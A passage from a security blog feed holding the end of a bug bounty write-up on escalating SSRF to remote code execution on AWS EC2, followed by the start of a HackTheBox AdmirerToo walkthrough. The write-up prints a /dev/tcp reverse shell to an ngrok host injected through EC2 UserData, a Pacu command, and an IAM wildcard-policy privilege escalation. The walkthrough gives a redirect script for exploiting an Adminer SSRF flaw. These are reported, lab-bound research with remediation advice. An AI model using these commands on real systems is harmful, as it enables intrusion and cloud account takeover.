213.62.1.1:8000/`whoami`&#x27;</span></span><br><span class="line">An error occurred (AccessDeniedException) when calling the SendCommand operation: User: &lt;redacted&gt; is not authorized to perform: ssm:SendCommand on resource: &lt;redacted&gt;</span><br></pre></td></tr></table></figure><h3 id="via-UserData"><a href="#via-UserData" class="headerlink" title="via UserData"></a>via UserData</h3><p><em>This second method will trigger alarms and service downtime but can still achieve remote code execution in some scenarios.</em> </p><p>I<em>n order to not disrupt services this method got shared with the team first and after discussions we got a test instance on which we could validate the PoC safely.</em></p><p>When configuring an EC2 instance you can specify commands which will be automatically executed after booting a machine (via <code>UserData</code>).</p><p><code>UserData</code> are base64 encoded and can be retrieved through the <code>user-data</code> endpoint:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; curl http://169.254.169.254/latest/user-data </span><br></pre></td></tr></table></figure><p>Our goal here is to modify the <code>UserData</code> to include our command and restart the EC2 instance to get it executed upon boot. Of course this will trigger alarms and short downtime because the instance needs to be restarted.</p><p>Here is how to proceed:</p><ol><li>Stop the chosen instance</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws ec2 stop-instances –instance-ids i-xxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><ol><li>Add a reverse shell script at the end of the existing instance’s <code>Userdata</code> (if any)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/0.tcp.ngrok.io/15547 0&gt;&amp;1</span><br></pre></td></tr></table></figure><ol><li>Then update the <code>UserData</code> of the instance with the newly created script:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; base64 user_data.sh &gt; user_data64.sh</span><br><span class="line">&gt; aws ec2 modify-instance-attribute \\</span><br><span class="line">    --instance-id=i-xxxxxxxxxxxxxxx \\</span><br><span class="line">    --attribute userData --value file://user_data64.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>Start a local listener to catch the reverse shell</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -lvp 15547</span><br><span class="line">Listening on 0.0.0.0 15547</span><br></pre></td></tr></table></figure><ol><li>Launch the instance  with the newly added <code>UserData</code>:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws ec2 start-instances –instance-ids i-xxxxxxxxxxxxxxx</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>And bingo! We get a shell on the instance. </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -lvp <span class="number">15547</span></span><br><span class="line">Listening on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">15547</span></span><br><span class="line">[root@xxx-xx-xx-xxx html]# </span><br></pre></td></tr></table></figure><p><em>Note: All those step can be contained in one command using <a href="https://yeswehack.com/redirect?url=https://github.com/RhinoSecurityLabs/pacu&expires=1645125367&token=494266cb66d653e5833087b5b14b4f130b6b2e5682382983a8b66094c251bbe9">Pacu</a>:</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Pacu &gt; run ec2__startup_shell_script --script user_data.sh --instance-ids i-xxxxxxxxxxxxxxx@eu-west-1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Escalating-privileges"><a href="#Escalating-privileges" class="headerlink" title="Escalating privileges"></a>Escalating privileges</h2><p>Unfortunately we quickly notice that we barely have any permission on the instance. Bummer.</p><p>Fortunately we took note earlier that our current user have the permission to create policies version:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws iam get-policy-version --policy-arn arn:aws:iam::xxxxxxxxxxxxxxx:policy/MyPolicy --version-id v2</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;PolicyVersion&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2015-06-17T19:23;32Z&quot;</span>,</span><br><span class="line">        <span class="string">&quot;VersionId&quot;</span>: <span class="string">&quot;v2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Document&quot;</span>: &#123;</span><br><span class="line">                      <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">                              &#123;</span><br><span class="line">                                      <span class="string">&quot;Action&quot;</span>: <span class="string">&quot;iam:CreatePolicyVersion&quot;</span>,</span><br><span class="line">                                      <span class="string">&quot;Resource&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">                                      <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span></span><br><span class="line">                              &#125;</span><br><span class="line">                      ]</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="string">&quot;IsDefaultVersion&quot;</span>: <span class="string">&quot;false&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Let’s create a new policy with every permissions and set it as default:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@xxx-xx-xx-xxx html]# aws iam create-policy \</span><br><span class="line">    --set-as-default --policy-document \</span><br><span class="line">&#x27;&#123;</span><br><span class="line">    <span class="attr">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;Action&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span>: <span class="string">&quot;*&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure><p>And we are done! The new <code>ec2_role</code> is now allowed to perform any arbitrary action. Full control over the instance.</p><h2 id="Remediation-recommendation"><a href="#Remediation-recommendation" class="headerlink" title="Remediation recommendation"></a>Remediation recommendation</h2><p>See <a href="https://yeswehack.com/redirect?url=https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html&expires=1645125367&token=e9822bd3d7c7fd416cbd9a9b7fcf4f5c2abea5df02ccca194bd6efcae6ec731d">OWASP SSRF Prevention guide</a>.</p><p>To resume: </p><ul><li>Properly sanitize every user’s input.</li><li>Do not allow private IPs to be called from the proxy and use AWS EC2 Instance Metadata Service Version 2 (IMDSv2) since it <a href="https://yeswehack.com/redirect?url=https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/&expires=1645125367&token=83b2b191af75c75307a6abd2333daf3f4562cf7e237007ef491d7eb1c08e4d89">blocks most of SSRF attacks</a>.</li><li>Use the lowest privilege system user.</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://www.notion.so/Bug-Bounty-2b00d2f97a424b6285d50b4d468c2003">SSRF Bypass - Hacktricks</a>.</li><li><a href="https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/">Steal EC2 Metadata Credentials via SSRF</a>.</li><li><a href="https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530">Just Gopher It: Escalating a Blind SSRF to RCE</a>.</li><li><a href="https://rzepsky.medium.com/playing-with-cloudgoat-part-5-hacking-aws-with-pacu-6abe1cf5780d">Playing with CloudGoat: hacking AWS with Pacu</a>.</li></ul><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><p>July 20, 2021 — Reported<br>July 22, 2021 — Status: Accepted<br>July 23, 2021  — Status: Fixed, patch deployed.<br>July 24, 2021  — Contacted the team since the SSRF vulnerability was still present through IP based whitelist bypass and open redirect bypass.<br>July 24, 2021  — Status: Accepted (reopened).<br>August 1, 2021  — Status: Fixed, patch deployed.<br>August 1, 2021 — Rewarded.</p><hr><p>That’s it folks! I hope you liked this new format. As always do not hesitate to contact me for any questions or feedback!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> Bug Bounty </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> SSRF </tag>
            
            <tag> bug bounty </tag>
            
            <tag> AWS </tag>
            
            <tag> IAM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - AdmirerToo</title>
      <link href="/posts/admirertoo/"/>
      <url>/posts/admirertoo/</url>
      
        <content type="html"><![CDATA[<img alt="admiretoo-hackthebox" src="https://user-images.githubusercontent.com/9076747/166099416-e02b4a36-942c-4177-9532-89b1781b0e85.png" width="578"><p>AdmirerToo just retired on HackTheBox. It was a Hard difficulty Linux box. It was well designed and required to chain several exploits in order to retrieve the flags. The path to user was not that obvious and required a lot of enumeration. The box relied mainly on common vulnerabilities, with some of them rather unusual but very interesting to chain. In the end, it’s a tough but good box that I recommend.</p><p><strong>Tl;Dr:</strong> To get the user flag you first have to find and exploit a SSRF vulnerability in Adminer to discover a local instance of OpenTSDB, then use the SSRF to exploit a command injection vulnerability in OpenTSDB to get your first shell. After enumeration, a database password re-use allows you to connect and get the user flag.<br>For the root flag you first have to discover an Opencats instance vulnerable to arbitrary file write. A fail2ban client is vulnerable to command injection when you can control the result of a <code>whois</code> query to your attacking IP address. Using the Opencats instance to write a <code>whois.conf</code> file pointing to your malicious <code>whois</code> server allows you to exploit the Fail2ban command injection to get a root shell.</p><hr><p>First things first, let’s add the box IP to the “hosts” file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.129.111.234 admirertoo.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>And let’s start!</p><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>We start we the usual <code>nmap</code> scan to discover the running services:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC admirertoo.htb</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-30 09:11 UTC</span><br><span class="line">Nmap scan report <span class="keyword">for</span> admirertoo.htb (10.129.111.234)</span><br><span class="line">Host is up (0.031s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)</span><br><span class="line">|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)</span><br><span class="line">|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-title: Admirer</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 9.02 seconds</span><br></pre></td></tr></table></figure><p>As usual we have the port SSH (<code>22</code>) open as well as port <code>80</code> with a simple image gallery landing page:</p><p><img src="https://user-images.githubusercontent.com/9076747/166100552-bc08c462-cf7e-4f7a-8911-b00771e42a69.png" alt="https://user-images.githubusercontent.com/9076747/166100552-bc08c462-cf7e-4f7a-8911-b00771e42a69.png"></p><p>Let’s do the usual web page enumeration on this page.<br>Trying to fuzz for hidden endpoints with <code>gobuster</code> doesn’t return anything interesting: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://admirertoo.htb&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://admirertoo.htb</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /home/vagrant/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/04/30 09:25:11 Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess            (Status: 403) [Size: 330]</span><br><span class="line">/.htpasswd            (Status: 403) [Size: 330]</span><br><span class="line">/css                  (Status: 301) [Size: 365] [--&gt; http://admirertoo.htb/css/]</span><br><span class="line">/fonts                (Status: 301) [Size: 367] [--&gt; http://admirertoo.htb/fonts/]</span><br><span class="line">/img                  (Status: 301) [Size: 365] [--&gt; http://admirertoo.htb/img/]</span><br><span class="line">/js                   (Status: 301) [Size: 364] [--&gt; http://admirertoo.htb/js/]</span><br><span class="line">/manual               (Status: 301) [Size: 368] [--&gt; http://admirertoo.htb/manual/]</span><br></pre></td></tr></table></figure><p>Maybe we can try to brute-force <code>vhost</code> to find subdomains. But we get no luck either using <code>fuff</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ffuf -u http://admirertoo.htb/ -H <span class="string">&quot;Host: FUZZ.admirertoo.htb&quot;</span> -w ~/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 14099</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.4.1</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://admirertoo.htb/</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /home/vagrant/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.admirertoo.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 14099</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">:: Progress: [100000/100000] :: Job [1/1] :: 1117 req/sec :: Duration: [0:01:50] :: Errors: 0 :: </span></span><br></pre></td></tr></table></figure><p>Now what? Maybe it’s time to do what we should have done from the beginning and review the landing page manually to see if we can find any information that automated tools can’t find.<br>And indeed, while visiting a non-existing page we notice an interesting new domain in the <code>mailto</code> field:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl admirertoo.htb/hg8</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL was not found on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.38 (Debian) Server at <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;mailto:webmaster@admirer-gallery.htb&quot;</span>&gt;</span>admirertoo.htb<span class="tag">&lt;/<span class="name">a</span>&gt;</span> Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Let’s add <code>admirer-gallery.htb</code> to our host file and retry our <code>vhost</code> discovery:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ffuf -u http://admirer-gallery.htb/ -H <span class="string">&quot;Host: FUZZ.admirer-gallery.htb&quot;</span> -w ~/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 14099</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.4.1</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://admirer-gallery.htb/</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /home/vagrant/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.admirer-gallery.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 14099</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">db                      [Status: 200, Size: 2569, Words: 113, Lines: 63, Duration: 187ms]</span></span><br></pre></td></tr></table></figure><p>We finally find something interesting. After adding <code>db.admirer-gallery.htb</code> to our host file we can access an <code>Adminer</code> database instance.</p><blockquote><p>Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consists of a single file ready to deploy to the target server.<br><a href="https://www.adminer.org/">https://www.adminer.org/</a></p></blockquote><h3 id="Adminer-database"><a href="#Adminer-database" class="headerlink" title="Adminer database"></a>Adminer database</h3><p><img src="https://user-images.githubusercontent.com/9076747/166101730-f0ef713b-d71e-484c-a151-019ec4a43dff.png" alt="https://user-images.githubusercontent.com/9076747/166101730-f0ef713b-d71e-484c-a151-019ec4a43dff.png"></p><p>Oddly enough no credentials are needed to access the database. While looking at the source code we can see that the database password is actually hard-coded into the HTML form:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;auth[driver]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;server&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;auth[server]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;localhost&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;auth[username]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admirer_ro&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;auth[password]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1w4nn4b3adm1r3d2!&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;auth[db]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admirer&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;auth[permanent]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Enter&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The database itself doesn’t hold any interesting information.<br>Let’s see if we can exploit a vulnerability in Adminer instead. We know from the login page that the running version is <code>4.7.8</code>.</p><h3 id="SSRF-on-Adminer"><a href="#SSRF-on-Adminer" class="headerlink" title="SSRF on Adminer"></a>SSRF on Adminer</h3><p>A quick Google search return the following vulnerability that looks interesting to us:</p><blockquote><p><strong>CVE-2021-21311</strong>: In Adminer from version 4.0.0 and before 4.7.9 there is a server-side request forgery vulnerability. This is fixed in version 4.7.9.<br><a href="https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf">https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf</a></p></blockquote><p>The issue seems to rely on the <code>elastic</code> connection module. While configured for Elasticsearch Adminer will try to connect to the provided host (in our case our attacking machine with specific server response) and <a href="https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351">return the request response into the error message</a>.</p><p>The PoC PDF outlines the vulnerability in detail. We should be able to reproduce it on our instance. First of all we need to set up an intercept script to redirect traffic to localhost:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)-<span class="number">1</span> != <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: &#123;&#125; &lt;port_number&gt; &lt;url&gt;&quot;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">0</span>]))</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Redirect</span>(<span class="params">BaseHTTPRequestHandler</span>):</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span>(<span class="params">self</span>):</span></span><br><span class="line">       self.send_response(<span class="number">302</span>)</span><br><span class="line">       self.send_header(<span class="string">&#x27;Location&#x27;</span>, sys.argv[<span class="number">2</span>])</span><br><span class="line">       self.end_headers()</span><br><span class="line"></span><br><span class="line">HTTPServer((<span class="string">&quot;&quot;</span>, <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])), Redirect).serve_forever()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python redirect.py 80 http://127.0.0.1</span><br></pre></td></tr></table></figure><p>We can then use Burp Suite to intercept and modify the connection request in order to, firstly, point the connector to our attacking machine (which will be intercepted by the <code>[redirect.py](http://redirect.py)</code> script) and then modify the <code>auth_driver</code> to the vulnerable <code>elastic</code> driver:</p><p><img 